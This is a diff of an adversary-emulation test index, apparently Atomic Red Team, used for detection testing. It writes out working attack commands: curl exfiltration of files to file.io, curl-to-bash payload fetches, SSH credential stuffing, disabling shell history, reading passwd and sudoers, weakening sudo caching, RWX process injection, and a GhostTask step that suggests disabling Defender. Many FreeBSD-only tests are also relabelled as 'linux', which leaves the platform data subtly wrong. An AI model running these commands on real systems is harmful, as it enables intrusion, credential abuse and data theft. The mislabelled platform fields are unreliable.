-",freebsd,linux,macos,"test -e #{input_file} && gzip -k #{input_file} || (echo '#{input_content}' >> #{input_file}; gzip -k #{input_file})
+",linux,macos,,"test -e #{input_file} && gzip -k #{input_file} || (echo '#{input_content}' >> #{input_file}; gzip -k #{input_file})
 ",sh,False,,"rm -f #{input_file}.gz
 ",,,"input_arguments.input_file.description: Path that should be compressed
 
@@ -18965,7 +19039,7 @@ input_arguments.input_content.default: confidential! SSN: 078-05-1120 - CCN: 400
 
 "
 T1560.001,Archive Collected Data: Archive via Utility,Data Compressed - nix - tar Folder or File,7af2b51e-ad1c-498c-aca8-d3290c19535a,"An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.
-",freebsd,linux,macos,"tar -cvzf #{output_file} #{input_file_folder}
+",linux,macos,,"tar -cvzf #{output_file} #{input_file_folder}
 ",sh,False,,"rm -f #{output_file}
 ",,"dependencies.0.description: Folder to zip must exist (#{input_file_folder})
 
@@ -18987,7 +19061,7 @@ input_arguments.output_file.default: $HOME/data.tar.gz
 
 "
 T1560.001,Archive Collected Data: Archive via Utility,Data Encrypted with zip and gpg symmetric,0286eb44-e7ce-41a0-b109-3da516e05a5f,"Encrypt data for exiltration
-",freebsd,macos,linux,"mkdir -p #{test_folder}
+",linux,macos,,"mkdir -p #{test_folder}
 cd #{test_folder}; touch a b c d e f g
 zip --password ""#{encryption_password}"" #{test_folder}/#{test_file} ./*
 echo ""#{encryption_password}"" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip
@@ -19135,7 +19209,7 @@ if (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|V
 ",sh,True,,,,,
 T1497.001,Virtualization/Sandbox Evasion: System Checks,Detect Virtualization Environment (FreeBSD),e129d73b-3e03-4ae9-bf1e-67fc8921e0fd,"Detects execution in a virtualized environment.
 At boot, dmesg stores a log if a hypervisor is detected.
-",freebsd,,,"if [ ""$(sysctl -n hw.hv_vendor)"" != """" ]; then echo ""Virtualization Environment detected""; fi
+",linux,,,"if [ ""$(sysctl -n hw.hv_vendor)"" != """" ]; then echo ""Virtualization Environment detected""; fi
 ",sh,True,,,,,
 T1497.001,Virtualization/Sandbox Evasion: System Checks,Detect Virtualization Environment (Windows),502a7dc4-9d6f-4d28-abf2-f0e84692562d,"Windows Management Instrumentation(WMI) objects contains system information which helps to detect virtualization. This command will specifically attempt to get the CurrentTemperature value from this object and will check to see if the attempt results in an error that contains the word supported. This is meant to find the result of Not supported, which is the result if run in a virtual machine
 ",windows,,,"$error.clear()
@@ -19252,7 +19326,7 @@ which will force the StubPath payload (if set) to execute.
 & $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup
 ",powershell,True,,,,,
 T1087.001,Account Discovery: Local Account,Enumerate all accounts (Local),f8aab3dd-5990-4bf8-b8ab-2226c951696f,"Enumerate all accounts by copying /etc/passwd to another file
-",freebsd,linux,,"cat /etc/passwd > #{output_file}
+",linux,,,"cat /etc/passwd > #{output_file}
 cat #{output_file}
 ",sh,,,"rm -f #{output_file}
 ",,,"input_arguments.output_file.description: Path where captured results will be placed
@@ -19263,7 +19337,7 @@ input_arguments.output_file.default: /tmp/T1087.001.txt
 
 "
 T1087.001,Account Discovery: Local Account,View sudoers access,fed9be70-0186-4bde-9f8a-20945f9370c2,"(requires root)
-",freebsd,linux,macos,"if [ -f /etc/sudoers ]; then sudo cat /etc/sudoers > #{output_file}; fi;
+",linux,macos,,"if [ -f /etc/sudoers ]; then sudo cat /etc/sudoers > #{output_file}; fi;
 if [ -f /usr/local/etc/sudoers ]; then sudo cat /usr/local/etc/sudoers > #{output_file}; fi;
 cat #{output_file}
 ",sh,True,,"rm -f #{output_file}
@@ -19275,7 +19349,7 @@ input_arguments.output_file.default: /tmp/T1087.001.txt
 
 "
 T1087.001,Account Discovery: Local Account,View accounts with UID 0,c955a599-3653-4fe5-b631-f11c00eb0397,"View accounts with UID 0
-",freebsd,linux,macos,"grep 'x:0:' /etc/passwd > #{output_file}
+",linux,macos,,"grep 'x:0:' /etc/passwd > #{output_file}
 grep '*:0:' /etc/passwd >> #{output_file}
 cat #{output_file} 2>/dev/null
 ",sh,,,"rm -f #{output_file} 2>/dev/null
@@ -19287,7 +19361,7 @@ input_arguments.output_file.default: /tmp/T1087.001.txt
 
 "
 T1087.001,Account Discovery: Local Account,List opened files by user,7e46c7a5-0142-45be-a858-1a3ecb4fd3cb,"List opened files by user
-",freebsd,linux,macos,"username=$(id -u -n) && lsof -u $username
+",linux,macos,,"username=$(id -u -n) && lsof -u $username
 ",sh,,,,sh,"dependencies.0.description: check if lsof exists
 
 dependencies.0.prereq_command: which lsof
@@ -19313,7 +19387,7 @@ input_arguments.output_file.default: /tmp/T1087.001.txt
 
 "
 T1087.001,Account Discovery: Local Account,Show if a user account has ever logged in remotely (freebsd),0f73418f-d680-4383-8a24-87bc97fe4e35,"Show if a user account has ever logged in remotely
-",freebsd,,,"lastlogin > #{output_file}
+",linux,,,"lastlogin > #{output_file}
 cat #{output_file}
 ",sh,,,"rm -f #{output_file}
 ",,,"input_arguments.output_file.description: Path where captured results will be placed
@@ -19324,7 +19398,7 @@ input_arguments.output_file.default: /tmp/T1087.001.txt
 
 "
 T1087.001,Account Discovery: Local Account,Enumerate users and groups,e6f36545-dc1e-47f0-9f48-7f730f54a02e,"Utilize groups and id to enumerate users and groups
-",freebsd,linux,macos,"groups
+",linux,macos,,"groups
 id
 ",sh,,,,,,
 T1087.001,Account Discovery: Local Account,Enumerate users and groups,319e9f6c-7a9e-432e-8c62-9385c803b6f2,"Utilize local utilities to enumerate users and groups
@@ -20217,7 +20291,7 @@ input_arguments.evil_command.default: whoami
 
 "
 T1562.003,Impair Defenses: HISTCONTROL,Disable history collection (freebsd),cada55b4-8251-4c60-819e-8ec1b33c9306,"Disables history collection in shells
-",freebsd,,,"export HISTSIZE=0
+",linux,,,"export HISTSIZE=0
 #{evil_command}
 ",sh,,,,,,"input_arguments.evil_command.description: Command to run after shell history collection is disabled
 
@@ -20278,7 +20352,7 @@ if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo ""\$HISTFILESIZE is zero""; fi
 T1562.003,Impair Defenses: HISTCONTROL,Setting the HISTSIZE environment variable,386d3850-2ce7-4508-b56b-c0558922c814,"An Adversary may set the sh history files size environment variable (HISTSIZE) to zero to prevent the logging of commands to the history file after they log out of the system.
 
 Note: we don't wish to log out, so we are just confirming the value of HISTSIZE. In this test we 1. echo HISTSIZE 2. set it to zero 3. confirm that HISTSIZE is set to zero.
-",freebsd,,,"echo $HISTSIZE
+",linux,,,"echo $HISTSIZE
 export HISTSIZE=0
 if [ $(echo $HISTSIZE) -eq 0 ]; then echo ""\$HISTSIZE is zero""; fi
 # -> $HISTSIZE is zero
@@ -20297,7 +20371,7 @@ if [ $(echo $HISTFILE) == ""/dev/null"" ]; then echo ""\$HISTFILE is /dev/null""
 T1562.003,Impair Defenses: HISTCONTROL,Setting the HISTFILE environment variable (freebsd),f7308845-6da8-468e-99f2-4271f2f5bb67,"An Adversary may clear, unset or redirect the history environment variable HISTFILE to prevent logging of commands to the history file after they log out of the system.
 
 Note: we don't wish to log out, so we are just confirming the value of HISTFILE. In this test we 1. echo HISTFILE 2. set it to /dev/null 3. confirm that HISTFILE is set to /dev/null.
-",freebsd,,,"echo $HISTFILE
+",linux,,,"echo $HISTFILE
 export HISTFILE=""/dev/null""
 if [ $(echo $HISTFILE) == ""/dev/null"" ]; then echo ""\$HISTFILE is /dev/null""; fi
 # -> $HISTFILE is /dev/null
@@ -21180,7 +21254,7 @@ T1201,Password Policy Discovery,Examine password complexity policy - Ubuntu,085f
 ",linux,,,"cat /etc/pam.d/common-password
 ",bash,,,,,,
 T1201,Password Policy Discovery,Examine password complexity policy - FreeBSD,a7893624-a3d7-4aed-9676-80498f31820f,"Lists the password complexity policy to console on FreeBSD.
-",freebsd,,,"cat /etc/pam.d/passwd
+",linux,,,"cat /etc/pam.d/passwd
 ",sh,,,,,,
 T1201,Password Policy Discovery,Examine password complexity policy - CentOS/RHEL 7.x,78a12e65-efff-4617-bc01-88f17d71315d,"Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
 ",linux,,,"cat /etc/security/pwquality.conf
@@ -21271,7 +21345,7 @@ input_arguments.issuer_uri.default: http://contoso.com/adfs/services/trust/
 T1057,Process Discovery,Process Discovery - ps,4ff64f0b-aaf2-4866-b39d-38d9791407cc,"Utilize ps to identify processes.
 
 Upon successful execution, sh will execute ps and output to /tmp/loot.txt.
-",freebsd,linux,macos,"ps >> #{output_file}
+",linux,macos,,"ps >> #{output_file}
 ps aux >> #{output_file}
 ",sh,,,"rm #{output_file}
 ",,,"input_arguments.output_file.description: path of output file
@@ -21460,7 +21534,7 @@ input_arguments.network_range.default: 192.168.1.0/24
 T1046,Network Service Discovery,Port Scan Nmap for FreeBSD,f03d59dc-0e3b-428a-baeb-3499552c7048,"Scan ports to check for listening ports with Nmap.
 
 Upon successful execution, sh will utilize nmap, telnet, and nc to contact a single or range of addresses on port 80 to determine if listening. Results will be via stdout.
-",freebsd,,,"nmap -sS #{network_range} -p #{port}
+",linux,,,"nmap -sS #{network_range} -p #{port}
 telnet #{host} #{port}
 nc -nv #{host} #{port}
 ",sh,True,,,sh,"dependencies.0.description: Check if nmap command exists on the machine
@@ -21609,7 +21683,7 @@ sudo cat /etc/sudoers
 sudo vim /etc/sudoers
 ",sh,True,,,,,
 T1548.003,Abuse Elevation Control Mechanism: Sudo and Sudo Caching,Sudo usage (freebsd),2bf9a018-4664-438a-b435-cc6f8c6f71b1,"Common Sudo enumeration methods.
-",freebsd,,,"sudo -l      
+",linux,,,"sudo -l      
 sudo cat /usr/local/etc/sudoers
 sudo ee /usr/local/etc/sudoers
 ",sh,True,,,sh,"dependencies.0.description: Check if sudo is installed.
@@ -21624,7 +21698,7 @@ T1548.003,Abuse Elevation Control Mechanism: Sudo and Sudo Caching,Unlimited sud
 sudo visudo -c -f /etc/sudoers
 ",sh,True,,,,,
 T1548.003,Abuse Elevation Control Mechanism: Sudo and Sudo Caching,Unlimited sudo cache timeout (freebsd),a83ad6e8-6f24-4d7f-8f44-75f8ab742991,"Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
-",freebsd,,,"sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers
+",linux,,,"sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers
 sudo visudo -c -f /usr/local/etc/sudoers
 ",sh,True,,,sh,"dependencies.0.description: Check if sudo is installed.
 
@@ -21638,7 +21712,7 @@ T1548.003,Abuse Elevation Control Mechanism: Sudo and Sudo Caching,Disable tty_t
 sudo visudo -c -f /etc/sudoers
 ",sh,True,,,,,
 T1548.003,Abuse Elevation Control Mechanism: Sudo and Sudo Caching,Disable tty_tickets for sudo caching (freebsd),4df6a0fe-2bdd-4be8-8618-a6a19654a57a,"Sets sudo caching tty_tickets value to disabled. This is dangerous to modify without using 'visudo', do not do this on a production system.
-",freebsd,,,"sudo sh -c ""echo Defaults ""'!'""tty_tickets >> /usr/local/etc/sudoers""
+",linux,,,"sudo sh -c ""echo Defaults ""'!'""tty_tickets >> /usr/local/etc/sudoers""
 sudo visudo -c -f /usr/local/etc/sudoers
 ",sh,True,,,sh,"dependencies.0.description: Check if sudo is installed.
 
@@ -21681,7 +21755,7 @@ input_arguments.target_host.default: localhost
 
 "
 T1110.004,Brute Force: Credential Stuffing,SSH Credential Stuffing From FreeBSD,a790d50e-7ebf-48de-8daa-d9367e0911d4,"Using username,password combination from a password dump to login over SSH.
-",freebsd,,,"cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/
+",linux,,,"cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/
 for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d"":"" -f1`@#{target_host};done
 ",sh,False,,,sh,"dependencies.0.description: Requires SSHPASS
 
@@ -21727,7 +21801,7 @@ input_arguments.domain.default: $ENV:userdomain
 
 "
 T1059.004,Command and Scripting Interpreter: Bash,Create and Execute Bash Shell Script,7e7ac3ed-f795-4fa5-b711-09d6fbe9b873,"Creates and executes a simple sh script.
-",freebsd,linux,macos,"sh -c ""echo 'echo Hello from the Atomic Red Team' > #{script_path}""
+",linux,macos,,"sh -c ""echo 'echo Hello from the Atomic Red Team' > #{script_path}""
 sh -c ""echo 'ping -c 4 8.8.8.8' >> #{script_path}""
 chmod +x #{script_path}
 sh #{script_path}
@@ -21742,7 +21816,7 @@ input_arguments.script_path.default: /tmp/art.sh
 T1059.004,Command and Scripting Interpreter: Bash,Command-Line Interface,d0c88567-803d-4dca-99b4-7ce65e7b257c,"Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.
 
 Upon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.
-",freebsd,linux,macos,"curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
+",linux,macos,,"curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
 wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
 ",sh,,,"rm /tmp/art-fish.txt
 ",,,
@@ -21793,22 +21867,22 @@ input_arguments.linenum_url.default: https://raw.githubusercontent.com/rebootuse
 
 "
 T1059.004,Command and Scripting Interpreter: Bash,New script file in the tmp directory,8cd1947b-4a54-41fb-b5ea-07d0ace04f81,"An attacker may create script files in the /tmp directory using the mktemp utility and execute them. The following commands creates a temp file and places a pointer to it in the variable $TMPFILE, echos the string id into it, and then executes the file using bash, which results in the id command being executed.
-",freebsd,linux,,"TMPFILE=$(mktemp)
+",linux,,,"TMPFILE=$(mktemp)
 echo ""id"" > $TMPFILE
 bash $TMPFILE
 ",sh,False,,"rm $TMPFILE
 unset TMPFILE
 ",,,
 T1059.004,Command and Scripting Interpreter: Bash,What shell is running,7b38e5cc-47be-44f0-a425-390305c76c17,"An adversary will want to discover what shell is running so that they can tailor their attacks accordingly. The following commands will discover what shell is running.
-",freebsd,linux,,"echo $0
+",linux,,,"echo $0
 if $(env |grep ""SHELL"" >/dev/null); then env |grep ""SHELL""; fi
 if $(printenv SHELL >/dev/null); then printenv SHELL; fi
 ",sh,False,,,,,
 T1059.004,Command and Scripting Interpreter: Bash,What shells are available,bf23c7dc-1004-4949-8262-4c1d1ef87702,"An adversary may want to discover which shell's are available so that they might switch to that shell to tailor their attacks to suit that shell. The following commands will discover what shells are available on the host.
-",freebsd,linux,,"cat /etc/shells 
+",linux,,,"cat /etc/shells 
 ",sh,False,,,,,
 T1059.004,Command and Scripting Interpreter: Bash,Command line scripts,b04ed73c-7d43-4dc8-b563-a2fc595cba1a,"An adversary may type in elaborate multi-line shell commands into a terminal session because they can't or don't wish to create script files on the host. The following command is a simple loop, echoing out Atomic Red Team was here!
-",freebsd,linux,,"for i in $(seq 1 5); do echo ""$i, Atomic Red Team was here!""; sleep 1; done
+",linux,,,"for i in $(seq 1 5); do echo ""$i, Atomic Red Team was here!""; sleep 1; done
 ",sh,,,,,,
 T1059.004,Command and Scripting Interpreter: Bash,Obfuscated command line scripts,5bec4cc8-f41e-437b-b417-33ff60acf9af,"An adversary may pre-compute the base64 representations of the terminal commands that they wish to execute in an attempt to avoid or frustrate detection. The following commands base64 encodes the text string id, then base64 decodes the string, then pipes it as a command to bash, which results in the id command being executed.
 ",linux,,,"ART=$(echo -n ""id"" |base64 -w 0)
@@ -21817,7 +21891,7 @@ echo -n ""$ART"" |base64 -d |/bin/bash
 unset ART 
 ",sh,False,,,,,
 T1059.004,Command and Scripting Interpreter: Bash,Obfuscated command line scripts (freebsd),5dc1d9dd-f396-4420-b985-32b1c4f79062,"An adversary may pre-compute the base64 representations of the terminal commands that they wish to execute in an attempt to avoid or frustrate detection. The following commands base64 encodes the text string id, then base64 decodes the string, then pipes it as a command to bash, which results in the id command being executed.
-",freebsd,,,"ART=$(echo -n ""id"" |b64encode -r -)
+",linux,,,"ART=$(echo -n ""id"" |b64encode -r -)
 echo ""\$ART=$ART""
 echo -n ""$ART"" |b64decode -r |/bin/sh
 unset ART
@@ -21836,7 +21910,7 @@ dependencies.0.get_prereq_command: echo ""Automated installer not implemented ye
 
 ",
 T1059.004,Command and Scripting Interpreter: Bash,Change login shell (freebsd),33b68b9b-4988-4caf-9600-31b7bf04227c,"An adversary may want to use a different login shell. The chsh command changes the user login shell. The following test, creates an art user with a /bin/sh shell, changes the users shell to sh, then deletes the art user. 
-",freebsd,,,"pw useradd art -g wheel -s /bin/csh
+",linux,,,"pw useradd art -g wheel -s /bin/csh
 cat /etc/passwd |grep ^art
 chsh -s /bin/sh art
 cat /etc/passwd |grep ^art
@@ -21854,7 +21928,7 @@ echo $ART |/bin/bash
 ",bash,False,,"unset ART
 ",,,
 T1059.004,Command and Scripting Interpreter: Bash,Environment variable scripts (freebsd),663b205d-2121-48a3-a6f9-8c9d4d87dfee,"An adversary may place scripts in an environment variable because they can't or don't wish to create script files on the host. The following test, in a bash shell, exports the ART variable containing an echo command, then pipes the variable to /bin/sh
-",freebsd,,,"export ART='echo ""Atomic Red Team was here... T1059.004""'
+",linux,,,"export ART='echo ""Atomic Red Team was here... T1059.004""'
 echo $ART |/bin/sh
 ",sh,False,,"unset ART
 ",,,
@@ -21880,7 +21954,7 @@ input_arguments.remote_url.default: https://raw.githubusercontent.com/redcanaryc
 
 "
 T1059.004,Command and Scripting Interpreter: Bash,Detecting pipe-to-shell (freebsd),1a06b1ec-0cca-49db-a222-3ebb6ef25632,"An adversary may develop a useful utility or subvert the CI/CD pipe line of a legitimate utility developer, who requires or suggests installing their utility by piping a curl download directly into bash. Of-course this is a very bad idea. The adversary may also take advantage of this BLIND install method and selectively running extra commands in the install script for those who DO pipe to bash and not for those who DO NOT. This test uses curl to download the pipe-to-shell.sh script, the first time without piping it to bash and the second piping it into bash which executes the echo command.
-",freebsd,,,"cd /tmp
+",linux,,,"cd /tmp
 curl -s #{remote_url}
 ls -la /tmp/art.txt
 curl -s #{remote_url} |bash
@@ -21901,14 +21975,8 @@ input_arguments.remote_url.default: https://raw.githubusercontent.com/redcanaryc
 
 "
 T1059.004,Command and Scripting Interpreter: Bash,Current kernel information enumeration,3a53734a-9e26-4f4b-ad15-059e767f5f14,"An adversary may want to enumerate the kernel information to tailor their attacks for that particular kernel. The following command will enumerate the kernel information.
-",linux,,,"cd /tmp
-curl -s #{remote_url}
-ls -la /tmp/art.txt
-curl -s #{remote_url} |sh
-ls -la /tmp/art.txt      
-",sh,False,,"rm /tmp/art.txt
-uname -srm
-",,,
+",linux,,,"uname -srm
+",sh,False,,,,,
 T1552.006,Unsecured Credentials: Group Policy Preferences,GPP Passwords (findstr),870fe8fb-5e23-4f5f-b89d-dd7fe26f3b5f,"Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.
 ",windows,,,"findstr /S cpassword %logonserver%\sysvol\*.xml
 ",command_prompt,,,,powershell,"dependencies.0.description: Computer must be domain joined
@@ -22266,7 +22334,7 @@ input_arguments.timeout.default: 1
 
 "
 T1529,System Shutdown/Reboot,Restart System via `shutdown` - FreeBSD/macOS/Linux,6326dbc4-444b-4c04-88f4-27e94d0327cb,"This test restarts a FreeBSD/macOS/Linux system.
-",freebsd,macos,linux,"shutdown -r #{timeout}
+",linux,macos,,"shutdown -r #{timeout}
 ",sh,True,,,,,"input_arguments.timeout.description: Time to restart (can be minutes or specific time)
 
 input_arguments.timeout.type: string
@@ -22275,7 +22343,7 @@ input_arguments.timeout.default: now
 
 "
 T1529,System Shutdown/Reboot,Shutdown System via `shutdown` - FreeBSD/macOS/Linux,4963a81e-a3ad-4f02-adda-812343b351de,"This test shuts down a FreeBSD/macOS/Linux system using a halt.
-",freebsd,macos,linux,"shutdown -h #{timeout}
+",linux,macos,,"shutdown -h #{timeout}
 ",sh,True,,,,,"input_arguments.timeout.description: Time to shutdown (can be minutes or specific time)
 
 input_arguments.timeout.type: string
@@ -22284,22 +22352,22 @@ input_arguments.timeout.default: now
 
 "
 T1529,System Shutdown/Reboot,Restart System via `reboot` - FreeBSD/macOS/Linux,47d0b042-a918-40ab-8cf9-150ffe919027,"This test restarts a FreeBSD/macOS/Linux system via `reboot`.
-",freebsd,macos,linux,"reboot
+",linux,macos,,"reboot
 ",sh,True,,,,,
 T1529,System Shutdown/Reboot,Shutdown System via `halt` - FreeBSD/Linux,918f70ab-e1ef-49ff-bc57-b27021df84dd,"This test shuts down a FreeBSD/Linux system using `halt`.
-",freebsd,linux,,"halt -p
+",linux,,,"halt -p
 ",sh,True,,,,,
 T1529,System Shutdown/Reboot,Reboot System via `halt` - FreeBSD,7b1cee42-320f-4890-b056-d65c8b884ba5,"This test restarts a FreeBSD system using `halt`.
-",freebsd,,,"halt -r
+",linux,,,"halt -r
 ",sh,True,,,,,
 T1529,System Shutdown/Reboot,Reboot System via `halt` - Linux,78f92e14-f1e9-4446-b3e9-f1b921f2459e,"This test restarts a Linux system using `halt`.
 ",linux,,,"halt --reboot
 ",bash,True,,,,,
 T1529,System Shutdown/Reboot,Shutdown System via `poweroff` - FreeBSD/Linux,73a90cd2-48a2-4ac5-8594-2af35fa909fa,"This test shuts down a FreeBSD/Linux system using `poweroff`.
-",freebsd,linux,,"poweroff
+",linux,,,"poweroff
 ",sh,True,,,,,
 T1529,System Shutdown/Reboot,Reboot System via `poweroff` - FreeBSD,5a282e50-86ff-438d-8cef-8ae01c9e62e1,"This test restarts a FreeBSD system using `poweroff`.
-",freebsd,,,"poweroff -r 3
+",linux,,,"poweroff -r 3
 ",sh,True,,,,,
 T1529,System Shutdown/Reboot,Reboot System via `poweroff` - Linux,61303105-ff60-427b-999e-efb90b314e41,"This test restarts a Linux system using `poweroff`.
 ",linux,,,"poweroff --reboot
@@ -22475,8 +22543,31 @@ input_arguments.pid.type: string
 input_arguments.pid.default: (Start-Process calc.exe -PassThru).Id
 
 "
+T1055,Process Injection,Read-Write-Execute process Injection,49543237-25db-497b-90df-d0a0a6e8fe2c,"This test exploited the vulnerability in legitimate PE formats where sections have RWX permission and enough space for shellcode.
+The RWX injection avoided the use of VirtualAlloc, WriteVirtualMemory, and ProtectVirtualMemory, thus evading detection mechanisms 
+that relied on API call sequences and heuristics. The RWX injection utilises API call sequences: LoadLibrary --> GetModuleInformation --> GetModuleHandleA --> RtlCopyMemory --> CreateThread.
+The injected shellcode will open a message box and a notepad.
+RWX Process Injection, also known as MockingJay, was introduced to the security community by SecurityJoes.
+More details can be found at https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution.
+The original injector and idea were developed for game cheats, as visible at https://github.com/M-r-J-o-h-n/SWH-Injector.
+",windows,,,"$address = (& ""$PathToAtomicsFolder\T1055\bin\x64\searchVuln.exe"" ""$PathToAtomicsFolder\T1055\bin\x64\vuln_dll\"" | Out-String | Select-String -Pattern ""VirtualAddress: (\w+)"").Matches.Groups[1].Value
+& ""PathToAtomicsFolder\T1055\bin\x64\RWXinjectionLocal.exe"" ""#{vuln_dll}"" $address
+",powershell,True,,Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force,powershell,"dependencies.0.description: Utility to inject must exist on disk at specified location (#{vuln_dll})
+
+dependencies.0.prereq_command: if (Test-Path ""#{vuln_dll}"") {exit 0} else {exit 1}
+
+dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{vuln_dll}"") -ErrorAction ignore | Out-Null
+Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/bin/x64/vuln_dll/msys-2.0.dll"" -OutFile ""#{vuln_dll}""
+
+","input_arguments.vuln_dll.description: vulnerable DLL
+
+input_arguments.vuln_dll.type: path
+
+input_arguments.vuln_dll.default: PathToAtomicsFolder\T1055\bin\x64\vuln_dll\msys-2.0.dll
+
+"
 T1048.002,Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,Exfiltrate data HTTPS using curl windows,1cdf2fb0-51b6-4fd8-96af-77020d5f1bf0,"Exfiltrate data HTTPS using curl to file share site file.io
-",windows,,,"#{curl_path} -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/
+",windows,,,"#{curl_path} -k -F ""file=@#{input_file}"" https://file.io/
 ",command_prompt,False,,,powershell,"dependencies.0.description: Curl must be installed on system.
 
 dependencies.0.prereq_command: if (Test-Path #{curl_path}) {exit 0} else {exit 1}
@@ -22507,7 +22598,7 @@ input_arguments.curl_path.default: C:\Windows\System32\Curl.exe
 
 "
 T1048.002,Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,"Exfiltrate data HTTPS using curl freebsd,linux or macos",4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01,"Exfiltrate data HTTPS using curl to file share site file.io
-",macos,linux,freebsd,"curl -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/
+",macos,linux,,"curl -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/
 ",bash,False,,,,,"input_arguments.input_file.description: Test file to upload
 
 input_arguments.input_file.type: path
@@ -22543,7 +22634,7 @@ chmod +x 'testdirwithspaceend /init '
 './testdirwithspaceend /init '
 ",bash,,,rm -rf /tmp/atomic-test-T1036.006,,,
 T1036.006,Masquerading: Space after Filename,Space After Filename (FreeBSD),cfc1fbb5-caae-4f4c-bfa8-1b7c8b5cc4e8,"Space after filename.
-",freebsd,,,"mkdir -p /tmp/atomic-test-T1036.006
+",linux,,,"mkdir -p /tmp/atomic-test-T1036.006
 cd /tmp/atomic-test-T1036.006
 mkdir -p 'testdirwithspaceend '
 /bin/echo ""#\!/bin/sh"" > ""testdirwithspaceend /init "" && echo 'echo ""print(\""running T1035.006 with space after filename to masquerade init\"")"" | python3.9' >> ""testdirwithspaceend /init "" && echo ""exit"" >> ""testdirwithspaceend /init ""      
@@ -22710,6 +22801,53 @@ $NewAction = New-ScheduledTaskAction -Execute ""Notepad.exe""
 Set-ScheduledTask ""AtomicTaskModifed"" -Action $NewAction
 ",powershell,False,,"Unregister-ScheduledTask -TaskName ""AtomicTaskModifed"" -confirm:$false >$null 2>&1
 ",,,
+T1053.005,Scheduled Task/Job: Scheduled Task,"Scheduled Task (""Ghost Task"") via Registry Key Manipulation",704333ca-cc12-4bcf-9916-101844881f54,"Create a scheduled task through manipulation of registry keys. This procedure is implemented using the [GhostTask](https://github.com/netero1010/GhostTask) utility. By manipulating registry keys under HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree, the tool creates user-specified scheduled tasks without a corresponding Windows Event 4698, which is logged when scheduled tasks are created through conventional means.
+This requires a download of the GhostTask binary, which must be run as NT Authority\SYSTEM. Upon successful execution of this test, a scheduled task will be set to run at logon which launches notepad.exe or runs a user-specified command.
+For further exploration of this procedure and guidance for hunting and detection, see [Hunting G-G-G-GhostTasks!](https://medium.com/p/154b50ab6a78).
+",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" \\#{target} -accepteula -s ""cmd.exe""
+""PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe"" \\#{target} add #{task_name} ""cmd.exe"" ""/c #{task_command}"" #{user_name} logon
+",command_prompt,True,,"""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" \\#{target} -accepteula -s ""cmd.exe""
+""PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe"" \\#{target} delete #{task_name} > nul",powershell,"dependencies.0.description: PsExec tool from Sysinternals must exist in the ExternalPayloads directory
+
+dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"") { exit 0} else { exit 1}
+
+dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
+Invoke-WebRequest ""https://download.sysinternals.com/files/PSTools.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip""
+Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\PsTools"" -Force
+Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe"" ""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" -Force
+
+dependencies.1.description: GhostTask.exe tool from netero101 must exist in the ExternalPayloads directory. This tool may be quarantined by windows defender; disable windows defender real-time protection to fix it or add the ExternalPayloads directory as an exclusion, using a command like `Add-MpPreference -ExclusionPath ""PathToAtomicsFolder\..\ExternalPayloads\""`
+
+dependencies.1.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe"") { exit 0} else { exit 1}
+
+dependencies.1.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
+Invoke-WebRequest ""https://github.com/netero1010/GhostTask/releases/download/1.0/GhostTask.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe""
+
